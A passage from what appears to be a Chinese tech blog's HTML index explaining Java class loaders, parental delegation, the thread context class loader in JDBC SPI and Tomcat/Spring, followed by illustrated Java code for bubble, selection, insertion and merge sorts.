class=\"comment\">//clazz class loader: com.whh.netty.Main$1@372f7a8d</span></span><br><span class=\"line\">        System.out.printf(<span class=\"string\">&quot;Person class loader: %s\\n&quot;</span>, Person.class.getClassLoader());<span class=\"comment\">//Person class loader: sun.misc.Launcher$AppClassLoader@14dad5dc</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>上述中使用自定义类加载器生成的class和直接使用该类并不相等，因为是有不同的类加载器所加载。</p>\n<p>在JVM中提供了3种类加载器：Bootstrap类加载器、Extension类加载器、System类加载器。</p>\n<h4 id=\"Bootstrap类加载器\"><a href=\"#Bootstrap类加载器\" class=\"headerlink\" title=\"Bootstrap类加载器\"></a>Bootstrap类加载器</h4><p>Bootstrap类加载器主要用于加载JVM自身需要的类，改类加载器主要使用C++实现，是JVM自身的一部分。服装架加载<code>$JAVA_HOME/lib</code>下核心类库或者<code>-Xbootclasspath</code>参数指定路径下的jar包。为了安全起见Bootstrap类加载器值加载包名为java、javax、sun等开头的类。</p>\n<h4 id=\"Extension类加载器\"><a href=\"#Extension类加载器\" class=\"headerlink\" title=\"Extension类加载器\"></a>Extension类加载器</h4><p><code>sun.misc.Launcher.ExtClassLoader</code>是Extension类加载器的实现类，负责加载<code>$JAVA_HOME/lib/ext</code>目录下或者由<code>-Djava.ext.dir</code>指定路径中的包。继承关系如下：<br><img src=\"/images/old/20180424%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72018-04-24%E4%B8%8A%E5%8D%8810.46.26.png\"></p>\n<h4 id=\"System类加载器\"><a href=\"#System类加载器\" class=\"headerlink\" title=\"System类加载器\"></a>System类加载器</h4><p><code>sun.misc.Launcher.AppClassLoader</code>是System类加载器的实现类，负责加载类<code>java-classpath</code>或<code>-D java.class.path</code>指定路径下的类。通过<code>ClassLoader.getSystemClassLoader()</code>可以获取该类加载器.</p>\n<p>在平常使用时，几乎都是由上述3中类加载器加载类。在JVM中，JVM对class加载是按需加载，使用才会被加载，import并不会加载。</p>\n<h3 id=\"双亲委派模式\"><a href=\"#双亲委派模式\" class=\"headerlink\" title=\"双亲委派模式\"></a>双亲委派模式</h3><p>对于双亲委派模式，如果一个类加载器需要加载一个类，并不是直接加载类，而是由把该请求提交给其父类加载器（此处父类加载器并不是继承关系，是组合关系），如果父类加载器还有父类加载器就一直提交，顶层Bootstrap类加载器，如果其中父类加载器可以完成加载任务，那么就成功返回，如果所有父类加载都无法完成加载，那么由子类完成加载。在使用双亲委派模式下，除了Bootstrap没有父类加载器，其他类加载器都必须有父类加载器。（源码可查看java.lang.ClassLoader#loadClass(java.lang.String, boolean)，先通过父类加载）</p>\n<p>优点在于，Java类随着类加载器一起具备了优先级的层级关系，避免了基础类被随意加载破坏程序的稳定性。</p>\n<p>虚拟机在使用内加载器时会调用<code>loadClassInternal</code>方法，该方法再调用<code>loadClass</code>。所以重写<code>loadClass</code>即可实现自定义类加载器。但是因为双亲委派模式核心就在<code>loadClass</code>中，所以如果想不破坏双亲委派模式就不建议覆盖<code>loadClass</code>方法，可以通过覆盖<code>findClass</code>方法来自定义类加载器。<br>修改之前例子，把重新<code>loadClass</code>修改为重写<code>findClass</code>就会发现，自定义类加载器加载的Person比较返回true。</p>\n<p>在使用自定义类加载器时，通过debug模式下，可以获取父类加载<br>自定义类加载器 –parent-&gt; AppClassLoader<br>AppClassLoader –parent-&gt; ExtClassLoader<br>ExtClassLoader –parent-&gt; null</p>\n<p>上述自定义类加载器可以通过分析<code>java.lang.ClassLoader</code>源码得知。</p>\n<ul>\n<li>在使用双亲委派模式时，如果希望获取两个不同Class对象，一种方法是重写<code>loadClass</code>不使用双亲委派模式，一种是直接使用<code>findClass</code>，绕过双亲委派，一般在热部署的时候使用。</li>\n</ul>\n<h3 id=\"线程上下文类加载器\"><a href=\"#线程上下文类加载器\" class=\"headerlink\" title=\"线程上下文类加载器\"></a>线程上下文类加载器</h3><p>在使用SPI时，Java提供接口，由第三方实现接口，如JDBC、JNDI等，Java提供的接口存在于<code>rt.jar</code>中，由<code>Bootstrap类加载器</code>加载，第三方包通常放在classpath中，由<code>System类加载器</code>加载。如果有<code>rt.jar</code>中SPI调用子类实现方法，双亲委派模式的原因，无法使用<code>System类加载器</code>加载的类。</p>\n<p>在平常使用jdbc时代码如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span><span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">url</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;jdbc:mysql://localhost:3306/test&quot;</span>;</span><br><span class=\"line\">        <span class=\"type\">Connection</span> <span class=\"variable\">conn</span> <span class=\"operator\">=</span> java.sql.DriverManager.getConnection(url, <span class=\"string\">&quot;root&quot;</span>, <span class=\"string\">&quot;password&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">PreparedStatement</span> <span class=\"variable\">preparedStatement</span> <span class=\"operator\">=</span> conn.prepareStatement(<span class=\"string\">&quot;select * from item where status = ?&quot;</span>);</span><br><span class=\"line\">        preparedStatement.setInt(<span class=\"number\">1</span>, <span class=\"number\">1</span>);</span><br><span class=\"line\">        <span class=\"type\">ResultSet</span> <span class=\"variable\">resultSet</span> <span class=\"operator\">=</span> preparedStatement.executeQuery();</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (resultSet.next())&#123;</span><br><span class=\"line\">            System.out.println(resultSet.getString(<span class=\"string\">&quot;sku_code&quot;</span>));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        conn.close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>上述代码中没有和以前使用<code>Class.forName(&quot;com.mysql.jdbc.Driver&quot;)</code>，因为<code>DriverManager</code>中使用SPI注册了Mysql驱动，而且就是使用了线程上下文类加载器实现。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//java.sql.DriverManager</span></span><br><span class=\"line\"><span class=\"keyword\">static</span> &#123;</span><br><span class=\"line\">    loadInitialDrivers();</span><br><span class=\"line\">    println(<span class=\"string\">&quot;JDBC DriverManager initialized&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//加载driver</span></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">loadInitialDrivers</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">//...</span></span><br><span class=\"line\">    AccessController.doPrivileged(<span class=\"keyword\">new</span> <span class=\"title class_\">PrivilegedAction</span>&lt;Void&gt;() &#123;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> Void <span class=\"title function_\">run</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">//创建serviceLoader</span></span><br><span class=\"line\">            ServiceLoader&lt;Driver&gt; loadedDrivers = ServiceLoader.load(Driver.class);</span><br><span class=\"line\">            Iterator&lt;Driver&gt; driversIterator = loadedDrivers.iterator();</span><br><span class=\"line\">            <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">while</span>(driversIterator.hasNext()) &#123;</span><br><span class=\"line\">                    driversIterator.next();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span>(Throwable t) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// Do nothing</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//...</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//java.util.ServiceLoader#load(java.lang.Class&lt;S&gt;)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> &lt;S&gt; ServiceLoader&lt;S&gt; <span class=\"title function_\">load</span><span class=\"params\">(Class&lt;S&gt; service)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">//获取线程中的classload（sun.misc.Launcher.AppClassLoader），并创建值，这里设置的classLoader在后续会使用到</span></span><br><span class=\"line\">    <span class=\"type\">ClassLoader</span> <span class=\"variable\">cl</span> <span class=\"operator\">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ServiceLoader.load(service, cl);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//java.util.ServiceLoader.LazyIterator#hasNextService</span></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"type\">boolean</span> <span class=\"title function_\">hasNextService</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (nextName != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (configs == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">//得的Driver路径： META-INF/services/java.sql.Driver</span></span><br><span class=\"line\">            <span class=\"comment\">//在mysql driver 5.1.40版本中该文件：</span></span><br><span class=\"line\">            <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">             *  com.mysql.jdbc.Driver</span></span><br><span class=\"line\"><span class=\"comment\">             *  com.mysql.fabric.jdbc.FabricMySQLDriver</span></span><br><span class=\"line\"><span class=\"comment\">             */</span></span><br><span class=\"line\">            <span class=\"type\">String</span> <span class=\"variable\">fullName</span> <span class=\"operator\">=</span> PREFIX + service.getName();</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (loader == <span class=\"literal\">null</span>)</span><br><span class=\"line\">                configs = ClassLoader.getSystemResources(fullName);</span><br><span class=\"line\">            <span class=\"keyword\">else</span></span><br><span class=\"line\">                configs = loader.getResources(fullName);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (IOException x) &#123;</span><br><span class=\"line\">            fail(service, <span class=\"string\">&quot;Error locating configuration files&quot;</span>, x);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//存储上述文件中值</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> ((pending == <span class=\"literal\">null</span>) || !pending.hasNext()) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!configs.hasMoreElements()) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        pending = parse(service, configs.nextElement());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    nextName = pending.next();</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//java.util.ServiceLoader.LazyIterator#nextService</span></span><br><span class=\"line\"><span class=\"keyword\">private</span> S <span class=\"title function_\">nextService</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!hasNextService())</span><br><span class=\"line\">        <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">NoSuchElementException</span>();</span><br><span class=\"line\">    <span class=\"comment\">//com.mysql.jdbc.Driver、com.mysql.fabric.jdbc.FabricMySQLDriver</span></span><br><span class=\"line\">    <span class=\"type\">String</span> <span class=\"variable\">cn</span> <span class=\"operator\">=</span> nextName;</span><br><span class=\"line\">    nextName = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    Class&lt;?&gt; c = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">//通过之前设置的sun.misc.Launcher.AppClassLoader获取class</span></span><br><span class=\"line\">        <span class=\"comment\">//因为这里使用Class.forName，所以在最初使用的时候，就不需要手动加载</span></span><br><span class=\"line\">        <span class=\"comment\">//注册Driver到DriverManager中</span></span><br><span class=\"line\">        c = Class.forName(cn, <span class=\"literal\">false</span>, loader);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (ClassNotFoundException x) &#123;</span><br><span class=\"line\">        fail(service,</span><br><span class=\"line\">                <span class=\"string\">&quot;Provider &quot;</span> + cn + <span class=\"string\">&quot; not found&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!service.isAssignableFrom(c)) &#123;</span><br><span class=\"line\">        fail(service,</span><br><span class=\"line\">                <span class=\"string\">&quot;Provider &quot;</span> + cn  + <span class=\"string\">&quot; not a subtype&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">S</span> <span class=\"variable\">p</span> <span class=\"operator\">=</span> service.cast(c.newInstance());</span><br><span class=\"line\">        providers.put(cn, p);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> p;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (Throwable x) &#123;</span><br><span class=\"line\">        fail(service,</span><br><span class=\"line\">                <span class=\"string\">&quot;Provider &quot;</span> + cn + <span class=\"string\">&quot; could not be instantiated&quot;</span>,</span><br><span class=\"line\">                x);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Error</span>();          <span class=\"comment\">// This cannot happen</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在上述代码中<code>java.util.ServiceLoader.LazyIterator#nextService</code>在<code>rt.jar</code>中，是由<code>Bootstrap类加载器</code>加载，因为要使用<code>System类加载器</code>中的类，所以通过<code>getContextClassLoader</code>获取<code>sun.misc.Launcher.AppClassLoader</code>来加载<code>classpath</code>中的类。</p>\n<p>在之后<code>connection</code>中，会通过获取<code>DriverManager</code>中注册的<code>registeredDrivers</code>，重新通过当前类<code>调用类的ClassLoader</code>或者当前线程的<code>getContextClassLoader</code>来加载一次<code>Driver</code>同时判断本次加载的<code>Driver</code>和之前注册的<code>Driver</code>是否相同，由同一个类加载器所加载。</p>\n<h3 id=\"Tomcat类加载\"><a href=\"#Tomcat类加载\" class=\"headerlink\" title=\"Tomcat类加载\"></a>Tomcat类加载</h3><p>在tomcat中一般可以部署多个应用，不同应用如果依赖了同一个jar不同版本，这样就需要使用不同的类加载器来隔离应用。同时如果不同应用依赖相同的版本，也可以把依赖的jar放入共有类加载器中。 </p>\n<p>Tomcat服务器类加载器如下：<br><img src=\"/images/old/2018042420160925001518808.png\"></p>\n<p>在Tomcat中需要在conf&#x2F;catalina.properties中配置<code>server.loader</code>和<code>share.loader</code>后才会建立<code>CatalinaClassLoader</code>和<code>SharedClassLoader</code>，否则使用<code>CommonClassLoader</code>代替。因为默认配置中没有所以合并后变成了<code>lib</code>目录，如果需要可以建立、<code>common</code>、<code>server</code>、<code>shared</code>目录分别对应<code>CommonClassLoader</code>、<code>CatalinaClassLoader</code>、<code>SharedClassLoader</code>。</p>\n<p>如果项目依赖于Spring，应用放入<code>webapps</code>中，依赖的jar包在<code>WEB-INF/lib</code>下。这时依赖的jar是由<code>WebappClassLoader</code>加载，不同的依赖由不同的<code>WebappClassLoader</code>加载，这样直接做到了应用的隔离。</p>\n<p>如果依赖的Spring在common、server等目录下，那么Spring隔离方式如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//org.springframework.web.context.ContextLoader#initWebApplicationContext</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> WebApplicationContext <span class=\"title function_\">initWebApplicationContext</span><span class=\"params\">(ServletContext servletContext)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">//...</span></span><br><span class=\"line\">    <span class=\"comment\">//直接获取当前线程中的ClassLoader</span></span><br><span class=\"line\">    <span class=\"type\">ClassLoader</span> <span class=\"variable\">ccl</span> <span class=\"operator\">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class=\"line\">    <span class=\"comment\">//如果当前线程中的classLoader和ContextLoader的classLoader一致，表示spring依赖在各自的目录中</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (ccl == ContextLoader.class.getClassLoader()) &#123;</span><br><span class=\"line\">        currentContext = <span class=\"built_in\">this</span>.context;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//如果不一致，那么吧当前线程的classLoader和当前context放入map中保存</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (ccl != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">        currentContextPerThread.put(ccl, <span class=\"built_in\">this</span>.context);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//...</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//org.springframework.web.context.ContextLoader#getCurrentWebApplicationContext</span></span><br><span class=\"line\"><span class=\"comment\">//获取当前context</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> WebApplicationContext <span class=\"title function_\">getCurrentWebApplicationContext</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">ClassLoader</span> <span class=\"variable\">ccl</span> <span class=\"operator\">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (ccl != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">        <span class=\"comment\">//先从之前保存的map中获取context</span></span><br><span class=\"line\">        <span class=\"type\">WebApplicationContext</span> <span class=\"variable\">ccpt</span> <span class=\"operator\">=</span> currentContextPerThread.get(ccl);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (ccpt != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> ccpt;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> currentContext;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>对于Spring而言，Spring中类加载器是通过当前线程中ClassLoader和ContextLoader.class.getClassLoader()比较来判断，是否属于同一个类加载器。</p>\n<p>参考：</p>\n<ul>\n<li>深入理解Java虚拟机</li>\n</ul>\n","categories":["Java基础"],"tags":["JVM","类加载"]},{"title":"算法图解-常用排序","url":"/2018/05/04/%E7%AE%97%E6%B3%95%E5%9B%BE%E8%A7%A3-%E5%B8%B8%E7%94%A8%E6%8E%92%E5%BA%8F/","content":"<h3 id=\"冒泡排序\"><a href=\"#冒泡排序\" class=\"headerlink\" title=\"冒泡排序\"></a>冒泡排序</h3><p>冒泡排序简单来说，就是从左到右排序，如果右边较大，交换二者位置，继续遍历直到末尾得到最大值。</p>\n<p>冒泡排序图解如下：<br><img src=\"/images/old/20180504bubblesort.gif\"></p>\n<span id=\"more\"></span>\n<p>图中先从第一个开始，依次和右边比较，如果右边较大就进行替换，直到末尾。<br>代码如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"type\">int</span>[] data;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">sort</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(() -&gt; &#123;</span><br><span class=\"line\">        <span class=\"comment\">//记录右边已经排好序的索引</span></span><br><span class=\"line\">        <span class=\"type\">int</span> <span class=\"variable\">rightIndex</span> <span class=\"operator\">=</span> data.length - <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">do</span> &#123;</span><br><span class=\"line\">            rectangles[<span class=\"number\">0</span>].setFill(Color.YELLOW);<span class=\"comment\">//图设置颜色、可忽略</span></span><br><span class=\"line\">            <span class=\"comment\">//从第一个开始遍历，直到右边已经排好序的索引</span></span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; rightIndex; i++) &#123;</span><br><span class=\"line\">                <span class=\"comment\">//图 忽略</span></span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    TimeUnit.MILLISECONDS.sleep(<span class=\"number\">200</span>);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">                    e.printStackTrace();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"comment\">//这里逻辑是如果i+1 的值大于 i 那么交换二者位置</span></span><br><span class=\"line\">                SortUtils.exchange(data, rectangles, i, i + <span class=\"number\">1</span>, <span class=\"number\">50</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"comment\">//遍历完成后找到当前最大值后，右边已经排好序的索引左移</span></span><br><span class=\"line\">            rightIndex--;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">while</span> (rightIndex &gt;= <span class=\"number\">0</span>);<span class=\"comment\">//如果已经排好序的索引&gt;=0表示已经拍下完毕。</span></span><br><span class=\"line\">        startBtn.setDisable(<span class=\"literal\">false</span>);</span><br><span class=\"line\">    &#125;).start();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>代码中包含了图形变换代码，直接忽略即可。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3poLWhhbnMvJUU1JTg2JTkyJUU2JUIzJUExJUU2JThFJTkyJUU1JUJBJThG\">wikipedia·冒泡排序<i class=\"fa fa-external-link-alt\"></i></span></p>\n<h3 id=\"选择排序\"><a href=\"#选择排序\" class=\"headerlink\" title=\"选择排序\"></a>选择排序</h3><p>选择排序和冒泡类似，先找到最大或者最小值。放入数组首尾。</p>\n<p>先看图：<br><img src=\"/images/old/20180504selectionsort.gif\"></p>\n<p>代码如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">sort</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">//从头遍历到尾</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; data.length; i++) &#123;</span><br><span class=\"line\">        <span class=\"comment\">//记录最小索引</span></span><br><span class=\"line\">        <span class=\"type\">int</span> <span class=\"variable\">minIndex</span> <span class=\"operator\">=</span> i;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">Rectangle</span> <span class=\"variable\">rectangle</span> <span class=\"operator\">=</span> rectangles[i];<span class=\"comment\">//忽略</span></span><br><span class=\"line\">        rectangle.setFill(Color.YELLOW);<span class=\"comment\">//忽略</span></span><br><span class=\"line\">        <span class=\"comment\">//从当前位置继续向后遍历，i 的数据表示已经做好了排序</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">j</span> <span class=\"operator\">=</span> i + <span class=\"number\">1</span>; j &lt; data.length; j++) &#123;</span><br><span class=\"line\">            rectangles[j].setFill(Color.RED);<span class=\"comment\">//忽略</span></span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                TimeUnit.MILLISECONDS.sleep(<span class=\"number\">200</span>);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">//如果向后遍历过程中，找到了最小值，所在最小索引为当前j</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (data[minIndex] &gt; data[j])&#123;</span><br><span class=\"line\">                rectangles[minIndex].setFill(Color.BLUE);</span><br><span class=\"line\">                rectangles[j].setFill(Color.YELLOW);</span><br><span class=\"line\">                minIndex = j;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                rectangles[j].setFill(Color.BLUE);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">//向右遍历完毕后，交换最小索引 和 i 的值</span></span><br><span class=\"line\">        SortUtils.changeData(data, rectangles, i, minIndex, <span class=\"number\">300</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>向右遍历，记录最小索引，放入最左边，直到数组遍历完毕。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3poLWhhbnMvJUU5JTgwJTg5JUU2JThCJUE5JUU2JThFJTkyJUU1JUJBJThG\">wikipedia·选择排序<i class=\"fa fa-external-link-alt\"></i></span></p>\n<h3 id=\"插入排序\"><a href=\"#插入排序\" class=\"headerlink\" title=\"插入排序\"></a>插入排序</h3><p>插入排序，在遍历过程中，保证左边已经是排好序，遍历的下一个数需要在已经排序的数组中找到自己的位置。<br>动图如下：<br><img src=\"/images/old/20180504insertsort.gif\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">sort</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">//从左遍历数组</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; data.length; i++) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        rectangles[i].setFill(Color.RED);</span><br><span class=\"line\">        <span class=\"comment\">//遍历节点i左边数组，目的是为了找到i节点在左侧已经排好序的数组中所在位置</span></span><br><span class=\"line\">        <span class=\"type\">int</span> <span class=\"variable\">insertIndex</span> <span class=\"operator\">=</span> i - <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (; insertIndex &gt;= <span class=\"number\">0</span>; insertIndex--) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                TimeUnit.MILLISECONDS.sleep(<span class=\"number\">300</span>);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"comment\">//如果从i节点反向遍历过程中，下一个节点大于当前节点那么交换二者位置</span></span><br><span class=\"line\">            <span class=\"comment\">//因为内循环是从i-1节点进行，比较的是i-1的左侧节点，如果左侧节点较大，那么交换位置</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (data[insertIndex] &gt; data[insertIndex + <span class=\"number\">1</span>]) &#123;</span><br><span class=\"line\">                SortUtils.changeData(data, rectangles, insertIndex, insertIndex + <span class=\"number\">1</span>, <span class=\"number\">100</span>);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"comment\">//如果左侧节点较小那么跳出内循环</span></span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        rectangles[insertIndex + <span class=\"number\">1</span>].setFill(Color.YELLOW);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>上述代码中，先从左侧开始遍历，然后遍历中的节点开始向右比较，直到直到正确的位置。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3poLWhhbnMvJUU2JThGJTkyJUU1JTg1JUE1JUU2JThFJTkyJUU1JUJBJThG\">wikipedia·插入排序<i class=\"fa fa-external-link-alt\"></i></span></p>\n<h3 id=\"并归排序\"><a href=\"#并归排序\" class=\"headerlink\" title=\"并归排序\"></a>并归排序</h3><p>并归排序是一种分治算法，把一个大数组先合并为一个个小数组，对小数组进行排序，之后再把小数组进行合并排序，直到最终合并为一个排好的大数组。在并归排序中需要引入额外的空间。</p>\n<p><img src=\"/images/old/20180504mergesort.gif\"></p>\n<p>上述图中可以看出，先是把数组进行对半分，直到划分为最小数组长度1~2，然后小数组排序后，在合并大数组。对于并归排序中可以采用Java中Fork&#x2F;Join进行加速排序</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">sort</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">    tmpRectangles = <span class=\"keyword\">new</span> <span class=\"title class_\">Rectangle</span>[data.length];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//构造一个新的数组，用于临时存储数据</span></span><br><span class=\"line\">    <span class=\"type\">int</span>[] tmpArr = <span class=\"keyword\">new</span> <span class=\"title 